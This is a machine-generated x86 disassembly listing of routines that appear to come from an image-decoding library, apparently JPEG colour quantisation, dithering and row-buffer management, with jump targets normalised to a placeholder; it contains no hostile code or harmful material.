add [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x50 ]
dec ecx
add [ ebp - 0x38 ] ecx
mov [ ebp - 0x40 ] 0xffffffff
mov [ ebp - 0x44 ] 0xfffffffd
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x10 ]
lea ecx [ ecx + ecx * 2 ]
mov edx [ eax + 0x20 ]
add ecx 0x3
add ecx ecx
add edx ecx
mov [ ebp - 0x30 ] edx
xor edx edx
mov eax [ ebp - 0x10 ]
mov [ eax + 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov ax [ ebp - 0x24 ]
mov [ ecx ] ax
mov edx [ ebp - 0x30 ]
mov cx [ ebp - 0x28 ]
mov [ edx + 0x2 ] cx
mov eax [ ebp - 0x30 ]
mov dx [ ebp - 0x2c ]
mov [ eax + 0x4 ] dx
inc [ ebp - 0x48 ]
add [ ebp - 0x70 ] 0x4
add [ ebp - 0x6c ] 0x4
mov ecx [ ebp - 0x48 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x44 ]
movsx edx [ ecx + eax * 2 ]
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x30 ]
add edi edx
movsx edx [ ecx + eax * 2 + 0x2 ]
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x30 ]
add esi edx
add edi 0x8
movsx edx [ ecx + eax * 2 + 0x4 ]
add ebx edx
mov ecx [ ebp - 0x58 ]
sar edi 0x4
add ebx 0x8
add esi 0x8
mov eax [ ebp - 0x58 ]
sar esi 0x4
mov edx [ ebp - 0x58 ]
sar ebx 0x4
mov edi [ ecx + edi * 4 ]
mov ecx [ ebp - 0x34 ]
mov esi [ eax + esi * 4 ]
mov ebx [ edx + ebx * 4 ]
mov edx [ ebp - 0x34 ]
xor eax eax
mov al [ ecx ]
xor ecx ecx
add edi eax
mov eax [ ebp - 0x34 ]
mov cl [ edx + 0x1 ]
xor edx edx
add esi ecx
mov ecx [ ebp - 0x54 ]
mov dl [ eax + 0x2 ]
xor eax eax
add ebx edx
mov edx [ ebp - 0x54 ]
mov al [ ecx + edi ]
xor ecx ecx
mov edi eax
mov eax [ ebp - 0x54 ]
mov cl [ edx + esi ]
xor edx edx
mov dl [ eax + ebx ]
mov eax edi
sar eax 0x3
mov ebx edx
mov edx [ ebp - 0x14 ]
mov esi ecx
mov ecx [ edx + eax * 4 ]
mov edx esi
sar edx 0x2
shl edx 0x6
add ecx edx
mov edx ebx
sar edx 0x3
add edx edx
add ecx edx
mov [ ebp - 0x3c ] ecx
mov ecx [ ebp - 0x3c ]
cmp [ ecx ] 0x0
jne r-xdata
xor eax eax
xor edx edx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x50 ]
xor ecx ecx
mov [ ebp - 0x4c ] eax
mov ebx ecx
cmp [ ebp - 0x4c ] 0x0
mov esi ecx
mov edi ecx
jbe r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x38 ]
movzx eax [ ecx ]
dec eax
mov [ edx ] al
xor edx edx
mov ecx [ ebp - 0x5c ]
mov dl [ ecx + eax ]
mov ecx [ ebp - 0x60 ]
sub edi edx
xor edx edx
mov dl [ ecx + eax ]
mov ecx [ ebp - 0x64 ]
sub esi edx
movzx eax [ ecx + eax ]
sub ebx eax
mov [ ebp - 0x68 ] edi
mov eax edi
mov dx [ ebp - 0x24 ]
add eax eax
add edi eax
mov ecx [ ebp - 0x30 ]
add dx di
add edi eax
mov [ ecx ] dx
mov edx [ ebp - 0x18 ]
add edx edi
add edi eax
mov [ ebp - 0x24 ] edx
mov eax esi
mov ecx [ ebp - 0x68 ]
add eax eax
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x68 ] esi
mov dx [ ebp - 0x28 ]
add esi eax
add dx si
mov ecx [ ebp - 0x30 ]
add esi eax
mov [ ecx + 0x2 ] dx
mov edx [ ebp - 0x1c ]
add edx esi
add esi eax
mov [ ebp - 0x28 ] edx
mov eax ebx
mov ecx [ ebp - 0x68 ]
add eax eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x68 ] ebx
mov dx [ ebp - 0x2c ]
add ebx eax
add dx bx
mov ecx [ ebp - 0x30 ]
add ebx eax
mov [ ecx + 0x4 ] dx
mov edx [ ebp - 0x20 ]
add edx ebx
add ebx eax
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x68 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x44 ]
add [ ebp - 0x34 ] eax
mov eax [ ebp - 0x40 ]
add [ ebp - 0x38 ] eax
mov edx [ ebp - 0x44 ]
add edx edx
add [ ebp - 0x30 ] edx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
ja r-xdata
mov edx ebx
sar edx 0x3
push edx
mov ecx esi
sar ecx 0x2
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_491ec8
sub_492378
push ebx
push esi
push edi
mov ecx 0x7fc
mov esi [ eax + 0x4 ]
mov ebx [ eax + 0x1cc ]
mov edx 0x1
call [ esi ]
mov ecx eax
xor edx edx
add ecx 0x3fc
xor eax eax
mov [ ebx + 0x28 ] ecx
mov ebx ecx
mov [ ebx ] edx
mov esi eax
neg esi
mov edi edx
neg edi
mov [ ecx + esi * 4 ] edi
add ebx 0x4
inc eax
inc edx
cmp eax 0x10
jl r-xdata
lea ebx [ ecx + eax * 4 ]
cmp eax 0x30
jge r-xdata
lea ebx [ ecx + eax * 4 ]
cmp eax 0xff
jg r-xdata
mov esi eax
mov edi edx
neg esi
neg edi
mov [ ebx ] edx
add ebx 0x4
inc eax
mov [ ecx + esi * 4 ] edi
test al 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi eax
mov edi edx
neg esi
neg edi
mov [ ebx ] edx
add ebx 0x4
inc eax
mov [ ecx + esi * 4 ] edi
cmp eax 0xff
jle r-xdata
mov esi 0x1
xor esi esi
jmp r-xdata
add edx esi
cmp eax 0x30
jl r-xdata
sub_492434
push ebx
push esi
mov esi eax
push edi
push ebp
push ecx
mov ebx [ esi + 0x1cc ]
mov eax [ ebx + 0x18 ]
mov [ esp ] eax
cmp [ esi + 0x58 ] 0x0
je r-xdata
test edx edx
je r-xdata
mov [ esi + 0x58 ] 0x2
cmp [ esi + 0x58 ] 0x2
jne r-xdata
mov [ ebx + 0x4 ] sub_491370
mov [ ebx + 0x8 ] sub_49240c
mov [ ebx + 0x1c ] 0x1
jmp r-xdata
mov [ ebx + 0x4 ] sub_491fa8
mov [ ebx + 0x4 ] sub_492074
jmp r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp edi 0x100
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x38
mov [ eax + 0x18 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] sub_492430
mov edi [ esi + 0x84 ]
cmp edi 0x1
jge r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ esp ]
mov esi eax
cmp [ esi + 0x58 ] 0x2
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x39
mov [ eax + 0x18 ] 0x100
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi ]
mov edx 0x1000
call sub_4977cc
inc edi
add esi 0x4
cmp edi 0x20
jl r-xdata
xor ecx ecx
mov [ ebx + 0x1c ] ecx
mov edi [ esi + 0x70 ]
add edi edi
lea edi [ edi + edi * 2 ]
add edi 0xc
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov edx edi
mov eax [ ebx + 0x20 ]
call sub_4977cc
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax esi
mov ecx edi
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov [ ebx + 0x20 ] eax
xor edx edx
mov [ ebx + 0x24 ] edx
mov eax esi
call sub_492378
sub_492550
push ebx
mov ebx eax
mov eax ebx
push esi
push edi
push ebp
mov esi [ eax + 0x4 ]
mov ecx 0x2c
mov edx 0x1
call [ esi ]
mov esi eax
xor eax eax
mov [ ebx + 0x1cc ] esi
xor edx edx
mov [ esi ] sub_492434
mov [ esi + 0xc ] sub_492540
mov [ esi + 0x20 ] eax
mov [ esi + 0x28 ] edx
cmp [ ebx + 0x78 ] 0x3
je r-xdata
mov eax ebx
mov ecx 0x80
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ esi + 0x18 ] eax
xor edi edi
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x2f
mov edx [ eax ]
call [ edx ]
mov eax ebx
mov ecx 0x1000
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov edx [ esi + 0x18 ]
mov [ edx + edi * 4 ] eax
inc edi
cmp edi 0x20
jl r-xdata
mov [ esi + 0x1c ] 0x1
cmp [ ebx + 0x6c ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x10 ] eax
mov edi [ ebx + 0x60 ]
cmp edi 0x8
jge r-xdata
cmp [ ebx + 0x58 ] 0x2
jne r-xdata
mov [ ebx + 0x58 ] 0x2
cmp edi 0x100
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x38
mov [ eax + 0x18 ] 0x8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x70 ]
mov eax ebx
add ecx ecx
mov edx 0x1
mov edi [ eax + 0x4 ]
lea ecx [ ecx + ecx * 2 ]
add ecx 0xc
call [ edi + 0x4 ]
mov [ esi + 0x20 ] eax
mov eax ebx
call sub_492378
mov eax ebx
push 0x3
mov ecx edi
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edi
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x39
mov [ eax + 0x18 ] 0x100
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x58 ] 0x0
je r-xdata
sub_492670
push ebx
push esi
mov ebx eax
push edi
add esp 0xfffffff0
mov eax [ ebx + 0x1a8 ]
mov [ esp ] eax
mov eax ebx
mov edx [ ebx + 0x13c ]
mov [ esp + 0x8 ] edx
mov edx 0x1
mov ecx [ ebx + 0x24 ]
mov esi [ eax + 0x4 ]
add ecx ecx
shl ecx 0x2
call [ esi ]
mov esi eax
mov eax [ esp ]
mov [ eax + 0x38 ] esi
mov edx [ ebx + 0x24 ]
mov ecx [ esp ]
shl edx 0x2
add esi edx
mov [ ecx + 0x3c ] esi
xor esi esi
mov eax [ ebx + 0xd8 ]
mov [ esp + 0xc ] eax
jmp r-xdata
cmp esi [ ebx + 0x24 ]
jl r-xdata
mov edx [ esp + 0xc ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0xc ]
imul [ edx + 0x24 ]
cdq
idiv [ ebx + 0x13c ]
mov [ esp + 0x4 ] eax
mov eax ebx
mov ecx [ esp + 0x8 ]
mov edx 0x1
add ecx 0x4
mov edi [ eax + 0x4 ]
imul ecx [ esp + 0x4 ]
add ecx ecx
shl ecx 0x2
call [ edi ]
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
shl edx 0x2
add eax edx
mov edx [ ecx + 0x38 ]
mov [ edx + esi * 4 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
add ecx 0x4
imul ecx [ esp + 0x4 ]
shl ecx 0x2
add eax ecx
mov ecx [ edx + 0x3c ]
mov [ ecx + esi * 4 ] eax
inc esi
add [ esp + 0xc ] 0x54
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_492738
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1a8 ]
xor eax eax
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov ecx [ ecx + 0x13c ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov eax [ edx + 0xd8 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x4 ]
lea eax [ edx + 0x8 ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov edx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0xc ]
imul [ edx + 0x24 ]
mov edx [ esp ]
mov ebx [ edx + 0x13c ]
cdq
idiv ebx
mov edx eax
mov eax [ esp + 0x4 ]
mov ebx [ esp + 0x8 ]
mov eax [ eax + 0x38 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ esp + 0x4 ]
mov edi ebx
mov eax [ eax + 0x3c ]
mov esi [ eax + esi * 4 ]
mov eax [ esp + 0x14 ]
mov eax [ eax ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x20 ] edi
mov edi esi
xor eax eax
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x10 ]
mov [ esp + 0x18 ] edi
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
lea edi [ ecx + 0x2 ]
imul edi edx
cmp eax edi
jl r-xdata
mov edi [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
inc eax
mov edi [ edi ]
mov [ ebp ] edi
mov ebp [ esp + 0x20 ]
mov [ ebp ] edi
add [ esp + 0x20 ] 0x4
add [ esp + 0x1c ] 0x4
add [ esp + 0x18 ] 0x4
xor eax eax
jmp r-xdata
mov edi edx
add edi edi
cmp eax edi
jl r-xdata
mov edi edx
mov ebp [ esp + 0x10 ]
imul edi ecx
add edi eax
push [ ebp + edi * 4 ]
lea edi [ ecx - 0x2 ]
pop ebp
imul edi edx
add edi eax
mov [ esi + edi * 4 ] ebp
lea edi [ ecx - 0x2 ]
imul edi edx
add edi eax
mov ebp [ esp + 0x10 ]
push [ ebp + edi * 4 ]
mov edi edx
pop ebp
imul edi ecx
add edi eax
inc eax
mov [ esi + edi * 4 ] ebp
xor eax eax
cmp edx eax
jle r-xdata
add [ esp + 0x14 ] 0x4
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
mov esi eax
sub esi edx
mov edi [ ebx ]
mov [ ebx + esi * 4 ] edi
inc eax
cmp edx eax
jg r-xdata
sub_492880
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1a8 ]
xor eax eax
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov ecx [ ecx + 0x13c ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov eax [ edx + 0xd8 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov edx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0xc ]
imul [ edx + 0x24 ]
mov edx [ esp ]
mov ebx [ edx + 0x13c ]
cdq
idiv ebx
mov edx eax
mov eax [ esp + 0x4 ]
mov ebx [ esp + 0x8 ]
mov eax [ eax + 0x38 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x3c ]
mov esi [ eax + esi * 4 ]
xor eax eax
mov edi esi
cmp edx eax
mov [ esp + 0x14 ] edi
mov edi ebx
mov [ esp + 0x10 ] edi
jle r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
lea edi [ ecx + 0x1 ]
imul edi edx
add edi eax
push [ ebx + edi * 4 ]
mov edi eax
sub edi edx
pop ebp
mov [ ebx + edi * 4 ] ebp
lea edi [ ecx + 0x1 ]
imul edi edx
add edi eax
push [ esi + edi * 4 ]
mov edi eax
sub edi edx
pop ebp
mov [ esi + edi * 4 ] ebp
lea edi [ ecx + 0x2 ]
imul edi edx
add edi eax
mov ebp [ esp + 0x10 ]
mov ebp [ ebp ]
mov [ ebx + edi * 4 ] ebp
lea edi [ ecx + 0x2 ]
imul edi edx
add edi eax
mov ebp [ esp + 0x14 ]
mov ebp [ ebp ]
mov [ esi + edi * 4 ] ebp
inc eax
add [ esp + 0x14 ] 0x4
add [ esp + 0x10 ] 0x4
cmp edx eax
jg r-xdata
sub_49297c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1a8 ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0xd8 ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edx [ esp ]
mov ebx [ ecx + 0xc ]
imul ebx [ eax + 0x24 ]
mov eax ebx
mov ecx [ edx + 0x13c ]
cdq
idiv ecx
mov esi eax
mov eax [ esp + 0xc ]
xor edx edx
mov eax [ eax + 0x2c ]
div ebx
mov ecx edx
test ecx ecx
jne r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ecx ebx
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ esp + 0x4 ]
mov eax [ edx + eax * 4 + 0x38 ]
mov edx [ esp + 0x8 ]
mov ebx [ eax + edx * 4 ]
xor eax eax
lea edx [ ebx + ecx * 4 - 0x4 ]
jmp r-xdata
lea eax [ ecx - 0x1 ]
cdq
idiv esi
inc eax
mov edx [ esp + 0x4 ]
mov [ edx + 0x48 ] eax
mov edi esi
add edi edi
cmp eax edi
jl r-xdata
lea edi [ eax + ecx ]
mov ebp [ edx ]
mov [ ebx + edi * 4 ] ebp
inc eax
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
sub_492a40
push ebx
sub edx 0x1
mov ebx [ eax + 0x1a8 ]
jb r-xdata
mov edx [ eax + 0x1c4 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
dec edx
je r-xdata
mov [ ebx + 0x4 ] sub_492aa8
mov [ ebx + 0x4 ] sub_492b20
call sub_492738
xor eax eax
mov [ ebx + 0x40 ] eax
xor ecx ecx
mov [ ebx + 0x44 ] ecx
xor eax eax
mov [ ebx + 0x4c ] eax
jmp r-xdata
mov [ ebx + 0x4 ] sub_492c48
pop ebx
retn
jmp r-xdata
xor edx edx
xor ecx ecx
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x34 ] ecx
pop ebx
retn
mov edx [ eax ]
mov [ edx + 0x14 ] 0x4
mov ecx [ eax ]
call [ ecx ]
pop ebx
retn
sub_492aa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi eax
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ esi + 0x1a8 ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ esi + 0x13c ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
push edx
push edi
mov ecx [ ebp - 0x4 ]
lea edx [ ebx + 0x8 ]
push ecx
lea ecx [ ebx + 0x34 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov esi [ eax + 0x1b0 ]
call [ esi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
lea edx [ ebx + 0x8 ]
mov eax esi
mov ecx [ eax + 0x1ac ]
call [ ecx + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor edx edx
xor ecx ecx
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x34 ] ecx
mov [ ebx + 0x30 ] 0x1
sub_492b20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x1a8 ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx [ ebx + 0x44 ]
sub edx 0x1
jb r-xdata
mov eax [ ebx + 0x40 ]
mov edx [ ebx + eax * 4 + 0x38 ]
mov eax esi
mov ecx [ eax + 0x1ac ]
call [ ecx + 0xc ]
test eax eax
je r-xdata
xor edx edx
mov [ ebx + 0x34 ] edx
mov ecx [ esi + 0x13c ]
dec ecx
mov [ ebx + 0x48 ] ecx
mov eax [ ebx + 0x4c ]
cmp eax [ esi + 0x140 ]
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov [ ebx + 0x30 ] 0x1
inc [ ebx + 0x4c ]
mov [ ebx + 0x44 ] 0x1
mov eax esi
call sub_49297c
mov edx [ ebx + 0x48 ]
push edx
mov ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebp - 0x8 ]
push eax
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebx + 0x34 ]
mov eax [ ebx + 0x40 ]
mov edx [ ebx + eax * 4 + 0x38 ]
mov eax esi
mov edi [ eax + 0x1b0 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x48 ]
jb r-xdata
dec edx
jne r-xdata
cmp [ ebx + 0x4c ] 0x1
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebx + 0x34 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov edx [ ebx + 0x40 ]
mov edi [ eax + 0x1b0 ]
mov edx [ ebx + edx * 4 + 0x38 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x48 ]
jb r-xdata
xor [ ebx + 0x40 ] 0x1
xor edx edx
mov [ ebx + 0x30 ] edx
mov ecx [ esi + 0x13c ]
inc ecx
mov [ ebx + 0x34 ] ecx
mov eax [ esi + 0x13c ]
add eax 0x2
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x44 ] 0x2
mov eax esi
call sub_492880
xor edx edx
mov [ ebx + 0x44 ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
sub_492c48
push ebp
mov ebp esp
push ebx
push 0x0
push edx
push ecx
mov edx [ ebp + 0x8 ]
push edx
xor edx edx
xor ecx ecx
mov ebx [ eax + 0x1b0 ]
call [ ebx + 0x4 ]
pop ebx
pop ebp
retn 0x4
sub_492c68
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ebp
mov ebx edx
mov edx 0x1
mov edi [ eax + 0x4 ]
add esp 0xfffffff4
mov ecx 0x50
call [ edi ]
mov edi eax
mov [ esi + 0x1a8 ] edi
mov [ edi ] sub_492a40
test ebx ebx
je r-xdata
mov ecx [ esi + 0x1c4 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x4
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx [ esi + 0x13c ]
mov [ esp + 0x8 ] ecx
cmp [ esi + 0x13c ] 0x2
jge r-xdata
mov eax [ esp ]
cmp eax [ esi + 0x24 ]
jl r-xdata
mov eax esi
call sub_492670
mov edx [ esi + 0x13c ]
add edx 0x2
mov [ esp + 0x8 ] edx
jmp r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x2f
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
imul [ ebx + 0x24 ]
cdq
idiv [ esi + 0x13c ]
mov [ esp + 0x4 ] eax
mov eax esi
mov ecx [ esp + 0x4 ]
mov edx 0x1
imul ecx [ esp + 0x8 ]
push ecx
mov ecx [ ebx + 0x1c ]
mov ebp [ eax + 0x4 ]
imul ecx [ ebx + 0x24 ]
call [ ebp + 0x8 ]
mov [ edi ] eax
add edi 0x4
inc [ esp ]
add ebx 0x54
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov ebx [ esi + 0xd8 ]
lea eax [ edi + 0x8 ]
mov edi eax
jmp r-xdata
sub_492d48
cmp [ eax + 0x148 ] 0x1
mov edx [ eax + 0x1ac ]
jle r-xdata
mov ecx [ eax + 0x140 ]
dec ecx
cmp ecx [ eax + 0x94 ]
jbe r-xdata
mov [ edx + 0x1c ] 0x1
jmp r-xdata
mov ecx [ eax + 0x14c ]
mov eax [ ecx + 0x48 ]
mov [ edx + 0x1c ] eax
mov eax [ eax + 0x14c ]
mov eax [ eax + 0xc ]
mov [ edx + 0x1c ] eax
jmp r-xdata
xor ecx ecx
xor eax eax
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_492da4
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x1ac ]
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor edx edx
mov [ ebx + 0x9c ] edx
pop esi
pop ebx
retn
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov [ esi + 0xc ] sub_493214
mov eax ebx
call sub_4933e4
test eax eax
je r-xdata
mov [ esi + 0xc ] sub_4934f4
jmp r-xdata
sub_492de0
push ebx
push esi
push edi
add esp 0xffffffc4
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1ac ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x15c ]
dec eax
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x140 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x18 ]
mov [ esp + 0x24 ] edx
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x1c ]
cmp eax [ esp + 0x24 ]
jg r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x14 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
cmp edx [ esp + 0x10 ]
ja r-xdata
mov edx [ esp ]
inc [ edx + 0x9c ]
mov ecx [ esp ]
inc [ ecx + 0x94 ]
mov eax [ ecx + 0x94 ]
mov edx [ esp ]
cmp eax [ edx + 0x140 ]
jae r-xdata
mov eax [ esp + 0x8 ]
xor edx edx
mov [ eax + 0x14 ] edx
inc [ esp + 0x24 ]
mov ecx [ esp ]
mov eax [ esp + 0x8 ]
mov edx [ ecx + 0x164 ]
mov eax [ eax + 0x20 ]
shl edx 0x7
call sub_4977cc
mov eax [ esp ]
mov edx [ esp + 0x8 ]
add edx 0x20
mov ecx [ eax + 0x1bc ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1b4 ]
call [ edx + 0xc ]
mov eax 0x4
mov eax [ esp ]
call sub_492d48
mov eax 0x3
jmp r-xdata
xor edx edx
xor ecx ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ecx
mov eax [ esp ]
lea edx [ eax + 0x14c ]
mov [ esp + 0x38 ] edx
jmp r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x24 ]
mov [ edx + 0x18 ] eax
xor eax eax
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov [ edx + 0x14 ] ecx
jmp r-xdata
add esp 0x3c
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx [ eax + 0x148 ]
cmp edx [ esp + 0x1c ]
jg r-xdata
mov ecx [ esp + 0x38 ]
mov ebx [ ecx ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x10 ]
jbe r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c0 ]
mov eax [ ebx + 0x4 ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ esp + 0x34 ] edx
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x10 ]
jae r-xdata
mov eax [ ebx + 0x3c ]
add [ esp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx + 0x44 ]
mov eax [ ebx + 0x34 ]
jmp r-xdata
inc [ esp + 0x1c ]
add [ esp + 0x38 ] 0x4
mov ecx [ esp + 0x20 ]
cmp ecx [ ebx + 0x38 ]
jl r-xdata
mov [ esp + 0x28 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ ebx + 0x4 ]
mov eax [ edx + ecx * 4 ]
mov edx [ esp + 0x24 ]
imul edx [ ebx + 0x24 ]
shl edx 0x2
add eax edx
mov [ esp + 0x2c ] eax
mov ecx [ esp + 0xc ]
imul ecx [ ebx + 0x40 ]
mov [ esp + 0x30 ] ecx
xor eax eax
mov [ esp + 0x20 ] eax
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x94 ]
cmp ecx [ esp + 0x14 ]
jb r-xdata
mov edi [ esp + 0x30 ]
xor esi esi
cmp esi [ esp + 0x28 ]
jge r-xdata
mov eax [ esp + 0x24 ]
add eax [ esp + 0x20 ]
cmp eax [ ebx + 0x48 ]
jge r-xdata
mov eax [ ebx + 0x34 ]
add [ esp + 0x18 ] eax
mov edx [ ebx + 0x24 ]
shl edx 0x2
add [ esp + 0x2c ] edx
inc [ esp + 0x20 ]
mov eax [ esp + 0x2c ]
push eax
push edi
mov edx [ esp + 0x20 ]
